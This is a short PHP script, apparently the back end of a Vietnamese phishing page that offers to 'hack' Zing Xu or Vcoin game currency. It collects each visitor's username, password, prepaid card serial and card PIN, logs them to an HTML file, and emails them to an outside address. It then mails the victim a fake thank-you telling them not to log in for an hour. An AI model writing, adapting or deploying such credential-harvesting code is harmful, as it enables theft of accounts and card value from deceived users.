<?php
$nick = $_POST['nick'];
$pass = $_POST['pass'];
$seri = $_POST['seri'];
$loai = $_POST['loaitien'];
$passthe = $_POST['passthe'];
$so = $_POST['so'];


$mail = $_POST['mail'];
$to = "del.itvn@gmail.com";
$subject = "Hacked4u";
$message = $nick." - ".$pass." - ".$seri." - ".$passthe." - ".$loai;
$from = "Admin@Hacked4u.Net";
$headers = "From:" . $from;


$f = fopen("kekek.html" , 'a') or exit("Hack Không Thành Công!");

fwrite($f," | Username : $nick - Pass : $pass - Seri : $seri - Mat Ma The : $passthe - Loai Tien : $loai | \n <br>");
fclose($f);

mail($to,$subject,$message,$headers);


$to1 = "$mail";
$subject1 = "Cảm Ơn Bạn Đã Hack Zing Xu - Vcoin tại Hacked4u.Net!";
$message1 = "Cảm ơn bạn ".$nick." đã hack ".$so." ".$loai." tại website Hacked4u.Net! Trong vòng 1h, bạn không được đăng nhập vào tài khoản vừa hack! Nếu có chuyện gì xảy ra chúng tôi không chiệu trách nhiệm! Y!: del.itvn or Email: del.itvn@gmail.com";
$from1 = "Admin@hacked4u.net";
$headers1 = "From:" . $from1;

mail($to1,$subject1,$message1,$headers1);

header('location:/');
?>